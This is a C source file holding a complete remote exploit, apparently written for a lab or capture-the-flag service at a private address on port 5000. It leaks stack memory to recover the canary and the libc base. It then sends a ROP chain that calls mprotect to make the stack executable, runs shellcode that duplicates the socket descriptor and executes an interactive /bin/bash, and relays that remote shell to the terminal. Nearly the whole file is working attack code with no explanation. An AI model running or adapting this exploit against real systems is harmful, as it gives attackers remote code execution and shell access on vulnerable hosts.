#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <string.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <sys/ioctl.h>


int main()
{
	struct sockaddr_in serv_addr;
	int sock, connfd;

	int shell[40];
	int pbuf[0x40];

	char *buf = (char *)pbuf;
	int buf_len = sizeof(pbuf);

	sock = socket(AF_INET, SOCK_STREAM, 0);
	if (sock < 0) {
		printf("socket() failed\n");
		return -1;
	}

	memset(&serv_addr, '0', sizeof(serv_addr));

	const char* ip = "192.168.122.229";
	serv_addr.sin_family = AF_INET;
	serv_addr.sin_port = htons(5000);
	inet_aton(ip, &serv_addr.sin_addr);

	int ret = connect(sock, (struct sockaddr*)&serv_addr, sizeof(serv_addr)); 
	if (ret < 0) {
		printf("connect failed\n");
		return -1;
	}
	int l = buf_len;
	if (write(sock, &l, sizeof(l)) < 0) {
                printf("write failed\n");
                exit(-1);
        }

	memset(pbuf, 0x0, buf_len);
	if (read(sock, pbuf, buf_len) < 0) {
		printf("read() failed\n");
		exit(-1);
	}
	
	for (int i= 0; i < buf_len/4; i++) {
		printf("->> %x\n", pbuf[i]);
	}

	memset(shell, 0x0, sizeof(shell));

	/* 8 Bytes shall be data for overflowed buffer */
	/* STACK CANARY PROTECTION */ shell[2] = pbuf[2];
	int libc_start = pbuf[29]; // extract __libc_start_main+0xf9
	printf("__libc_start_main+0xF9: %x\n", libc_start); // application saves return address of __libc_start_main+0xf5 on the stack
	libc_start -= 0x10E; // deduct offset to __libc_start_main
	libc_start -= 0x1edb0; // deduct offset from __libc_start_main to libc start
	printf("__libc_start: %x\n", libc_start);
	int ebp = pbuf[4];
	printf("EBP: %x\n", ebp);
	/* EBP */ shell[4] = ebp; // restore EBP
	// Libc offset to mprotect is 0xe80c0
	/* EBP - 0x4C */ shell[5] = libc_start+0xf2500; // return address: mprotect
	printf("mprotect: %x\n", shell[5]);
	/* ESP */ int esp = ((ebp - 0x10) & 0xfffff000);  // STACK address to be mprotect'ed
	printf("ESP: %x\n", esp);
	/* EIP */ int eip = ebp - 0x10; // -0x10 to exec stack
	printf("EIP: %x\n", eip);
	/* EBP - 0x48 */ shell[6] = eip; // return address 2 after mprotect exit
	/* EBP - 0x44 */ shell[7] = esp; // addr to be changed on stack
	/* EBP - 0x40 */ shell[8] = 0x2000; // 1 page length	
	/* EBP - 0x3C */ shell[9] = 0x7; // wrx
	/* EBP - 0x38 */ memcpy(&shell[10], "/bin/bash", strlen("/bin/bash"));
	/* EBP - 0x2C */ memcpy(&shell[13], "-i", strlen("-i"));
	/* EBP - 0x28 */ shell[14] = ebp - 0x38;
	/* EBP - 0x24 */ shell[15] = ebp - 0x2C;
	/* EBP - 0x20 */ shell[16] = 0x0;
	/* EBP - 0x1C */ shell[17] = pbuf[6]; // connfd
	/* EBP - 0x18 */ shell[18] = libc_start + 0xe4e40; // dup2@libc
	/* EBP - 0x14 */ shell[19] = libc_start + 0xbbfa0; // execve@libc
	//char shellcode[] = "\xf3\x0f\x1e\xfb\x31\xc9\x51\x8d\x45\xe4\x8b\x10\x52\x8d\x5d\xe8\xff\x13\x41\x83\xf9\x03\x75\xee\x6a\x00\x8d\x45\xd8\x50\x8d\x45\xc8\x50\x8d\x45\xec\xff\x10\xc9\xc3";
	char shellcode[] = "\x31\xc9\x51\x8d\x45\xe4\x8b\x10\x52\x8d\x5d\xe8\xff\x13\x41\x83\xf9\x03\x75\xee\x6a\x00\x8d\x45\xd8\x50\x8d\x45\xc8\x50\x8d\x45\xec\xff\x10";
	printf("->> %d len shellcode\n", sizeof(shellcode));
	/* EBP - 0x10 */ memcpy(&shell[20], shellcode, sizeof(shellcode));


	if (write(sock, shell, sizeof(shell)) < 0) {
		printf("write failed\n");
		exit(-1);
	}


	int flags;
	flags = fcntl(0, F_GETFL, 0);
	fcntl(0, F_SETFL, flags|O_NONBLOCK);
	flags = fcntl(sock,F_GETFL,0);
	fcntl(sock, F_SETFL, flags | O_NONBLOCK);

	fd_set rfds;
	int retval;

	while ( 1 ) {
		memset(buf, 0x0, buf_len);
           
		FD_ZERO(&rfds);
        	FD_SET(0, &rfds);
	   	FD_SET(sock, &rfds);

		retval = select(sock+1, &rfds, NULL, NULL, NULL);

           	if (retval == -1) {
               		perror("select()");
		} else if (retval) {
			int ret;
			if (FD_ISSET(sock, &rfds)) {
				ret = read(sock, buf, buf_len);
				write(1, buf, ret);
			}
			if (FD_ISSET(0, &rfds)) {
				ret = read(0, buf, buf_len);
				if (ret) {
					write(sock, buf, ret);
				}
			}
	   	}
	}

	return 0;
}
